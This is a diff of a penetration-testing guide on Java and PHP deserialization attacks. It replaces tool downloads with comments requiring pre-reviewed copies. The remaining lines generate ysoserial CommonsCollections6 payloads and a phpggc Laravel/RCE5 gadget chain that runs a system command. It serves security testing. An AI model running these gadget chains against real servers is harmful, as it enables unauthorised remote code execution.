@@ -78,7 +78,7 @@ Endpoints: /remoting/, /invoker/, /jmx-console/, /wls-wsat/
 ### Phase 1 — Java Deserialization (ysoserial)
 ```bash
 # Install ysoserial
-wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
+# Prerequisite: a previously reviewed immutable ysoserial-all.jar; stop if absent.
 
 # Generate OOB detection payload
 java -jar ysoserial-all.jar CommonsCollections6 \
@@ -104,7 +104,7 @@ grep -r "unserialize(" --include="*.php" .
 # If error changes → deserialization confirmed
 
 # Craft gadget chain using phpggc
-git clone https://github.com/ambionics/phpggc
+# Prerequisite: an existing reviewed phpggc installation; stop if absent.
 php phpggc -l  # list chains
 php phpggc Laravel/RCE5 system id | base64
 ```
